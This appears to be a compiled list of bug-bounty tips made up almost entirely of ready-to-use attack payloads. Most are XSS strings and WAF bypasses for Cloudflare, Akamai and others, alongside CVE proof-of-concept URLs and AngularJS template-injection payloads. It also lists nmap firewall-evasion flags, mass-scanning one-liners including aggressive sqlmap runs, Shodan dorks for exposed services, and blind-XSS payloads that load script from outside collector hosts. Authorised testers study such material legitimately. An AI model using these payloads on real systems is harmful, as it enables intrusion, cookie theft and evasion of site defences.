  -unicoded chars
  -DOM window
  -uncommon tags for filters
  -various mimics
- Cloudflare blocks alert(), prompt(), confirm()? Use another function to trigger XSS:
  Payload: document.write(atob(`PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`));
- Nmap Firewall Bypass Tips
  ** nmap 172.217.31.206 -f
  ** nmap 172.217.31.206 -A -T1
  ** nmap -sS -T2 192.168.0.0 -- script firewall-bypass
  ** nmap 172.217.31.206 -sS -sV -D RND:3
  To see full details
- XSS in Jenzabar (CVE-2021-26723)
  POC:
  /ics?tool=search&query="><script>alert('xss')</script>
- Found XSS Oracle Business Intelligence(CVE-2020-14815)
  POC:
  /bi-security-login/login.jsp?msi=false&redirect=">
  Ref:
- Found posting feature on a fairly new subdomain, runs AngualrJS 1.7.9
  {{ 7 * 7 }} -> 49
  {{constructor.constructor('alert(1)')()}} -> Stored XSS
  Neither html payloads or normal XSS payloads worked, whenever you find AngularJS instance test for possible CSTI's.
- Cloudflare XSS bypass that worked for me recently in a private program
  onfocus=alert(1) autofocus>
  Thank you @osama_hroot for your recent post !
- Tip_xss_1:
  Bypass eventhandler.
  onerror ==> block
  ONerror ==> allow
- Tip_xss_2:
  Bypass eventhandler.
  onerror ==> block
  ONerror ==> block
  ON%65rror ==> allow
- Tip_xss_3:
  Bypass eventhandler.
  onerror ==> block
  ONerror ==> block
  ON%65rror ==> block
  ON%2565rror ==> allow
- Tip_xss_4
  Bypass eventhandler.
  onerror ==> block
  ONerror ==> block
  ON%65rror ==> block
  ON%2565rror ==> block
  &#79;nerror ==> allow
- Tip_xss_5:
  Bypass eventhandler.
  onerror ==> block.
  onload ==> block.
  ...
  ...
  onauxclick ==> allow.
  Sometimes the coder forget to add one of eventhandler to blacklist so try with all eventhandler.
- Tip_xss_6:
  Bypass eventhandler.
  onerror ==> delete
  oneonerrorrror ==> onerror ==> allow
- AngularJS Client-Side Template Injection as XSS payload for 1.2.24-1.2.29:
  {{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
- Tip_xss_7:
  Bypass eventhandler.
  onerror ==> ononerror
  error ==> onerror ==> bypass
- Tip_xss_8:
  Bypass Eventhandler.
  onerror ==> block
  <script> ==> delete
  one<script>rror ==> allow
- Bypass xss:
   block
  <image src=x> allow
  <image src=x onxxx=1>block
  <image/src/onxxxxxx=1>allow
  <image/src/onerror=1>block
  <image/src/onauxclick=1>allow
  alert,confirm,prompt,write block.
  top[8680439..toString(30)](1)>allow
- Open Redirect Vulnerability scanning with gau gf qsreplace and httpx
  oneliner : gau http://testphp.vulnweb.com | gf xss | qsreplace "https://evil.com" | httpx -silent -status-code -location
- Tip_xss_12:
  onxxx==>block (length >=5)
  onxx==> allow (length <5)
  <iframe src=javascript:alert(4)> block
  <script/**b4walid**/>alert(4)</script> allow
- Tip_xss_13:
  onxxx==>block (length >=5)
  onxx==> allow (length <5)
  <iframe src=javascript:alert(4)> block
  <script/**b4walid**/>alert(4)</script> block
  <object data=javascript:alert(4)> allow
- ‘“`<u>blab${7*7}
  into every field you see to test for
  - SQLi
  - js XSS
  - html attribute xss
  - HTMLi XSS
  - SSTI
- Bug type: Reflected xss + cloudflare bypass
  program : Rdp
  Payload : <svg onload=alert%26%230000000040"1')>
- The Best XSS Polyglot! 🚨🚨
  jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
- Unicode normalization in webapps are often helpful in bypassing restrictions, particularly when it comes to WAF bypasses and SSRF. e.g.:
  ＜svg ⁄onload＝alert︵1)>
  ...turns to...
  <svg/onload=alert(1)>
  Here's a nice checklist:
  https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html…
- When hunting for postMessage vulnerabilities,
  you can score easy wins by inspecting urls transmission within the Cross-Origin traffic.
  Simply change their schema and escalate it to a DOM XSS.
  http://target[.]com -> javascript:alert(document.domain)
- Blind XSS Fired due to insecure review form!
  Try to inject your payload to any contact/review form you find, User-Agent header!
  Mozilla/5.0 ("><script src=https://sheldonx97.xss.ht></script>Windows NT 10.0; Win64; x64;rv:86.0) Gecko/20100101 Firefox/86.0
- Tip_xss_19:
  Bypass tags mix lowercase and uppercase.
  <script>alert(4)</script> :block
  <SCRIPT>alert(4)</SCRIPT> :block
  <ScRiPT>alert(4)</scRIPt> :allow
- Found Swagger API ?
  Try this XSS Reflected
  http://REDACTED/dochelper?userId=<script>alert(document.domain)</script>
- Tip_xss_22:
  Bypass tags add comment.
  <script>alert(4)</script> :block
  <script/**/>alert('b4walid')</script/**/>
- Tip_xss_23:
  Bypass tags write in comment.
  <script>alert(4)</script> :block
  <script/**/>alert('b4walid')</script/**/> :block
  <script/**sec4ever**/>alert('b4walid')</script/**sec4ever**/> :allow
- After 3 dups and 1 n/a , my stored Xss got accepted.
  Payload:  xD <img
  It was in comments where admin can assign task to anyone.
- Tip_xss_24:
  Bypass tags blacklist.
  <script>alert(4)</script> :block
   :block
  <svg> : block
  <image src=x> :allow
  *Note: on blacklist the most of developper forget <image><details>
- <script src="data:text/plain\x2Cjavascript:alert(1)"></script>
- XSS Polyglots
  –
  Example:
  jaVasCript:/–><svg/onload=’+/”/+/onmouseover=1/+/[/[]/+alert(1337)//’>
  –
  Credit :- @0dayCTF …
- Disclosing CVE-2020-17453! @JacofficenHHax
  XSS In WSO2 Carbon Management Console
  PoC: https://example[.]com/carbon/admin/login.jsp?msgId=%27;alert(1)//
- XSS 500 Internal Server error bypass :p
  <script>alert(1)</script> ==> 500 internal server error
  %253c/ScRipt%253e%253cScript%253ealert`1`;%253c/script%253e ==> Bypassed using Double Url Encoding :D
- Finding CSTI to XSS in 1 minute
  1. Web app uses angularjs.
  2. Use paramspider tool to find parameters.
  3. Replace {{constructor.constructor('alert(1)')()}} with FUZZ strings.
  4. Open all urls with open multiple urls add-ons.
  5. XSS.
- Performing recons in package.json. Congratulations
  @alxbrsn very insane this tactic, now I just have luck to find something.
  xargs -a dom -I@ sh -c 'python3 http://GitDorker.py -tf token -q @ -d Dorks/package.json | anew files'
- BUG: Reflected XSS POST-BASED.
  Payload used : "onpointerover=prompt(document["domain"])//
- Bypass Waf:
  AkamaiGhost
  ?x=<image/src/onerror=alert(0)> 403
  ?x=/onerror%3d1 403
  %25 ==> %
  % ==> delete
  <image/src/%onerror=ale%rt(0)>
- BugBounty Tip!
  CRLF to XSS
  CRLF:
  /%0AHeader:header
  XSS with CRLF:
  /%0ASet-Cookie:">
  👇:
  https://anysite.com/%0ASet-Cookie:">
- Angular 1.4.3 CSTI XSS Akamai WAF:
  {{([].toString()).constructor.prototype.charAt=[].join;$eval(([].toString()).constructor.fromCodePoint([120],[61],[49],[125],[125],[125],[59],[97],[108],[101],[114],[116],[40],[49],[41],[47],[47]));}}
- Put your target in txt file and run the following
  cat target.txt | waybackurls > waybackdata
  Now run the following
  cat waybackdata | gf xss | sort -u > xss.txt
  Now you have all xss endpoints with the helo of "gf"
- Tip bypass WAF :
  payload : alert(document.location.hash.substring(1))#(xss)
  go to console and tap : "#(xss)"
- xargs -a xss -P10 -I@ sh -c 'goop @ | grep 200'
  goop to search .git files.
  https://github.com/deletescape/goop…
- 4. That parameter was vulnerable for an open redirect.
  5. Then used simple XSS payload, ‘javascript:alert(document . domain);’
  6. XSS triggered successfully :)
  Reference:- https://gauravnarwani.com/a-tale-of-3-xss/…
- Simple bypassing WAF 405
  Reflected XSS into a JavaScript string
  '-alert(1)-' (WAF 405)
  '-alert/**/(1)-' (WAF 405)
  '-alert/*any*/(1)-' (Success)
- Reflected xss successfull payload for me:
  1.<b onmouseover=alert('Wufff!')>click me!</b>
  2."><script>propmt("mamunwhh")</script>
  3."><script>alert(document.cookie)</script>
  4. /><svg src=x onload=confirm("1337");>
- XSS payload to keep on your notes:
  <script>alert(1)</script> -> nginx block
  "> -> Wordfence block
  ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6 -> successful execution
- dalfox + gospider = XSS
  gospider -s http(s)://$target -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "="| qsreplace -a | dalfox pipe | tee result.txt
- one-liner to find SQLI in your target + subdomains:
  python3 http://paramspider.py -d http://target.com -s TRUE -e woff,ttf,svg,eot | deduplicate --sort | sed '1,4d' | httpx -silent | sqlmap --level=5 --risk=3
- XSS payload as an image filename:
  "><svg onmouseover=alert(1)>.svg
- Reflected XSS Akami Waf Bypass in Redirect Parameter using HTTP Parameter Pollution and Double Url Encode:
  /login?ReturnUrl=javascript:1&ReturnUrl=%2561%256c%2565%2572%2574%2528%2564%256f%2563%2575%256d%2565%256e%2574%252e%2564%256f%256d%2561%2569%256e%2529
- <script>confirm(0)</script> -> Access Denied
  </title><!--><svg onload%3Dlocation=loc%26%2397;tion.h%26%2397;sh.subst%26%23114;%26lpar;1)>#javascript:alert(document.domain) -> Access denies bypassed
- How an invalid fix from 2019 helped me find a XSS in CMS.
  2019 Fix: https://github.com/concrete5/concrete5/pull/7999/files…
  Exploit- https://example[.]com/ccm/system/panels/page/preview_as_user/preview?cID=>"<svg/onload=alert(%27document.domain%27)>
  Article - https://shifacyclewala.medium.com/concrete5-cms-xss-nuclei-template-writing-mass-hunting-with-shodan-wappalyzer-reporting-893ab97984dd…
- XSS attack being blocked?
  If onerror and alert are blocked try to put the blocked word into itself
  The filter might only make one pass through and remove only the first result it find
- XSS–
  python3 ~/tools/ParamSpider/paramspider.py –domain http://testphp.vulnweb.com
  cd output/
  cat http://testphp.vulnweb.com.txt | Gxss -p cyber
  cat http://testphp.vulnweb.com.txt | Gxss -p cyber | dalfox pipe –mining-dict ~/tools/Arjun/arjun/db/params.txt –skip-bav
  Th…
- Bug Bounty Technique:
  Moodle XSS:-
  example[.]com/mod/lti/auth.php?redirect_uri=javascript:alert(1)
- Bug Bounty Technique
  Bypass Cloud-Flare with Incorrect URL Encoding:
  <script>alert()</script> blocked
  %2sscript%2ualert()%2s/script%2u -xss popup
- Bug Bounty Technique
  XSS Payloads(High Rate of Success):
  <iframe src=//14.rs>
  <input type=button onMouseOver=prompt(document.domain)>
  <body/onload=confirm(1)>
- http.favicon.hash:"-438482901" Moodle Shodan favicon hash
  XSS : mod/lti/auth.php?redirect_uri=javascript:alert(document.domain)
- Bypass Cloudflare XSS payload
  "><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
- Found Sql injection With Error Massge ?
  Try :
  '>
- I found an (new?) XSS technique to perform alert(1) in RegExp.
  Is this a known technique?
  JS Code:
  Simple: '1'.replace(/.*/,alert)
  Cookie: document.cookie.replace(/.*/,alert)
  Fired in all browsers of Firefox, Chrome, Edge, Safari🔥
- Xss in asp pages reflected inside span and < blocked.
  Payloads:
  %u003Csvg onload=alert(1)>
  %u3008svg onload=alert(2)>
  %uFF1Csvg onload=alert(3)>
- For blind xss try to put your payload
  1) Feedback Form
  2) contact Form
  3) user-agent
  4) mail to support team
  5) Generate Bills
  Any form which are calling internals request.
- Useless endpoint to RXSS:
  1. Used Linkfinder to check if I can find any sensitive endpoints
  2. Ended up finding this: "php/terms/view?liso=<somethingsomething>" but no sensitive data exposed but one of the parameter is vulnerable to Reflected XSS.
- Moodle XSS
  example[.]com/mod/lti/auth.php?redirect_uri=javascript:alert(1)
   By
- Got an XSS (CSTI) :
  Changed team name to: {{ self.alert(1) }}
  Hover on the icon (where the {{ self.alert(1) }} reflected as 1) of the team: XSS Popup
- XSS alert(1) Obfuscation challenge!
  Code: top[x=document.createElement`a`,x.href=`http://ⓐⓛⓔⓡⓣ`,http://x.host]`1`
  It doesn't use regular parentheses or quotations.
  I think URL normalization is probably implemented in buggies in a format like NFKD?
- XSS payloads that worked on many private programs
  <x/oncut=alert(1)>a
  <body/onload=&lt;!--&gt;&#10alert(1)>
  <--` --!>
  ">
- Simple stored XSS
  Where a low privilege user added XSS in section name
  And when admin tries to edit, the XSS get fired and there cookie get stolen
  Paylaod - \">'>\">
- Concrete5 CMS Reflected XSS POC
  target[.]com/ccm/system/panels/page/preview_as_user/preview?cID="></iframe><svg/onload=alert(/vivek/)>
- If you see dangerouslySetInnerHTML in source code try this :
- Django debug page XSS (CVE-2017-12794).
  POC:
  http://redacted/create_user/?username=<script>alert(/XSS/)</script>
- New CloudFlare XSS bypass
  < svg on onload = ( alert ) ( document.domain ) >
  r " on onmouseover = ( alert ) ( document.domain ) //
  r * / eval ?. ( value % 2B / ( / . source ) // " > < input value = confirm autofocus onfocus = ' / * "
- assetfinder target url | gau | dalfox pipe | tee output.txt or -o youroutput txt
  Tip :- Better to save the results always
  To speed up this global flags can provide
  --skip-bav
  --skip-mining-dom
  --only-discovery
- XSS bypass
  <svg onload=alert&lpar;1&rpar;>
  <svg onload=alert&#40;1&#41>
  "o<x>nmouseover=alert<x>(1)//
- CloudFlare XSS bypass
  <a"/onclick=(confirm)(document.cookie)>Click Here!
  Dec: <svg onload=prompt%26%230000000040document.domain)>
  Hex: <svg onload=prompt%26%23x000000028;document.domain)>
- XSS in Cisco ASA CVE-2020-3580
  POST /+CSCOE+/saml/sp/acs?tgname=a
  Host:http://target.com
  Accept-Encoding: gzip deflate
  Accept: /
  Connection:close
  Content-Type: application/x-www-form-urlencoded
  Content-Length 52
  SAMLResponse="><svg/onload=alert('1')>
- Bug Bounty Tips
   | the () was blocked
  byapss:
   | bypassed
  I found that on RDP and Im waiting for their reply😁
- 1- Add ?redirect_uri at the end of the url
  2- Click intercept on burp proxy
  3- Do intercept response to this request
  4- Add ="> at the end of the request
  5- Now you should see alert box popping up
  Easy 1min xss go try it
- how do i find Blind XSS? Using dork
  1) site:*.target.com "Submit Feedback"
  2) site:*.target.com "Contacts us"
- Unique Ways:
  1. dig +multi AXFR @ns1.dns.co http://insecuredns.com
  2. CSP (curl -I -s -L https://some[.]com | grep -iE 'Content-Security|CSP')
  3. Github Subdomains
  4. nmap --script targets-asn --script-args targets-asn.asn=17012
  5. Scraping using webscrapers
- This has been annoying me that I couldn't find a nice way of converting the input to md5/base64/32 e.t.c so I just knocked this bash script up https://github.com/adamtlangley/hashit… now you can "seq 1 1000 | hashit md5 | ffuf -w - -u http://targetdomain.com/user/FUZZ"
- Add a SSTI payload to your Blind XSS payload, if you are lucky, you have a visual internal SSTI in a critical endpoint.
  ${{48*53}}`'";--><sCRIpt sRc=//your.oob></sCRIpt>
- Payloads for testing email field:
  XSS: "<script src=http://xsshunter.ht></script>"@x.com
  Template Injection: "<%=7*7 %>@x.com
  SQLi: "' OR 1=1 --"@x.com
  SSRF: xyz@burpcollab.net
  Parameter Pollution: victim&email=abc@x.com
  WildCard Abuse: %@x.com
- 1. waybackurls http://target.com | grep =http | tee -a target.txt
  2. cat target.txt | grep redirect= (find redirect url)
  3.https://target.com/abcd?redirect=javascript:alert(xss…)
- Find js File with hakrawler .
  cat alive_subdomains.txt | hakrawler | grep "script" | awk '{print $2}'
- Go to your android/ios device setting and change the device name to ur BXSS payload like "><script/src=//gujju.xss.ht>//" and enable 2FA for all applications using Authenticator/authy/okta. you might end up with blind XSS for the internal admin panel.
- Bypass rXSS Tips
  target(.)com/?s=<script>alert("5")</script> ==> blocked
  target(.)com/?s=-prompt(5)-
  ===> alert(5) bypass
- Akamai ARL misconfiguration: 🥷
  POC: /7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.location)%3E
- Simple reflect xss cloudflare Waf bypass in my case:
  Payload:
  %27%09);%0d%0a%09%09[1].find(alert)//
  Reflect in js code:
  <script>
  something;
  productId=('xsshere');
  Something;
  </script>
  Unfortunatly was duplicate. Not only me know bypass some waf. :)
- I Added a blind XSS payload in the contact-us form. 2 days later it was fired in the admin panel and also got a screenshot of the support desk exposing support requested user's details
  "><script src=https://your-handle.xss.ht></script>
- XSS WAF Bypass:
  <form><button formaction=javascript&colon;alert(1)>Click Here</button>
- </code><svg/onload=eval(atob(`WFNTIGhheG9y`))><code>
  The "</code> <code>" isn't required but in my case it was.
  WAF was removing "." spaces, single quotes, double quotes, it was blocking img tags, script tags etc
  I've learned a lot from @brutelogic
- gospider -s "https://remoteadmin.eu" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
- 4. I tried for open redirect and it worked.
  5. Then I tried for XSS and used this simple payload javascript:confirm(document .domain);
  6. Payload worked successfully , XSS confirmed :)
  p.s I found this just using my phone 😅
  2/2
- Open redirect to XSS [Filter Evasion] when unescape() is used:
  1. Try adding %09 in between javascript i.e. jav%09ascript:alert(1)
  2. If above doesn't work try adding its hex (or unicode) equivalent \x09 or \u0009
- easy xss
  Echo $ domain | subfinder -silent | httpx | hakrawler | grep = | kxss | grep '\"'
- Found a self xss?
  1- combine it with csrf. if the server is missing X-XSS-Protection header, you will catch good things.
  2-try this payload, check your server and look for XSPA vulnerability
  <script>window.location.replace("your server");</script>
- cPanel xss
  PoC: /login?user=sth%22+onfocus=%22alert()%22+id=%22xss%22+%22%ff#xss
  https://forums.cpanel.net/threads/cpanel-tsr-2021-0005-full-disclosure.693853/…
- XSS in Register function:
  Bypass validation and WAF via CRLF to capture cookie.
  Payload: ?%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E\r\nSet-Cookie%3a+value=thisisme
- A payload to bypass AWS WAF
- <script/]\/21ojkgdf-9<!----> >
- Incapsula WAF bypass payload: <style/onload=&nbsp;co\u006efirm("IncapsulaBypassByB4GG3R")></style>
- Stored XSS :
  1. Found an option to upload profile pic
  2. Uploaded an image -> Intercepted req in burp --> Change data to xss payload
  3. Changed Content type to text/html from image/png
  4. Got a response including url of image
  5. Opened it and got a pop-up
- CloudFlare waf block bypass ( xss )
  Payload : <svg onload=alert&#0000000040document.cookie)>
  it worked with me
- قد واجهتك فلتره على alert/prompt/confirm/eval وأنت تحاول تختبر ثغرات xss ؟
  جرب كذا
  <script>delete alert;alert(0)</script>
  ونستبدل الباقيه بنفس فكرة البايلود الاول مثال ..
  <script>delete alert;alert(0)</script>
  ملاحظة : جرب تكبر حرف وتصغر حرف أحياناً تتخطى
- Akamai XSS WAF bypass for ASP-style comma separated HTTP Parameter Pollution Reflection (Chrome only)
  ?id=1&id=2
  ⬇️
  <input value="1,2">
  ?id="&id=onpointerrawupdate="a=confirm&id=a(1)
  ⬇️
  <input value="", onpointerrawupdate="a=confirm, a(1)">
- XSS Install these tools:
  gospider -S targets_urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee result.txt
- Another XSS test:
  waybackurls http://target.com| grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
- To test XSS + SQLi + SSTI/CSTI with the same payload use :
  '"><svg/onload=prompt(5);>{{7*7}}
  ' ==> for Sql injection
  "><svg/onload=prompt(5);> ==> for XSS
  {{7*7}} ==> for SSTI/CSTI
- SHODAN Dorks (Part-1)
  -> "MongoDB Server Information" port:27017 -authentication
  -> "220" "230 Login successful." port:21
  -> x-jenkins 200
  -> port:23 console gateway
  -> http.html:"* The wp-config.php creation script uses this file"
  -> NCR Port:"161"
- SHODAN Dorks (Part-2)
  -> "root@" port:23 -login -password -name -Session
  -> title:"citrix gateway"
  -> "\x03\x00\x00\x0b\x06\xd0\x00\x00\x124\x00" (Windows RDP Passwords)
  -> x-jenkins 200
  -> http.html:"* The wp-config.php creation script uses this file"
- Cloudflare xss bypass
  <h1><b><svg onload=alert%26%230000000040`1`)></b></h1>
- https://github.com/R0X4R/bhedak
  cat urls | bhedak "\"><svg/onload=alert(1)>*'/---+{{7*7}}"
  Nice Tool @R0X4R
- Your can use HTML entities like &Tab; or &colon; or &NewLIne; in javascript protocol to bypass Xss protection in <a> Tag
  Examples:/
  <a href=" javas&tap;cript:alert(1)">
  <a href="javascript&colon;alert(2)">
  <a href="javas&NewLine;cript:alert(1)">
- Bugs: Information Disclosure and Cloudflare Bypass Reflected XSS
  Bypass payloads:
  <svg onload=prompt%26%230000000040document.domain)>
  <svg onload=prompt%26%23x000000028;document.domain)>
- Mine: <svg src=e onload=prompt(1)>
- XSS payloads but with the help of SVGs
  <svg>
   <script>alert(1)</script>
  <svg>
  Here is a writeup of this being exploited in wild
  👇
- XSS filter bypass payload: \&#34;+confirm(1)+&#34;
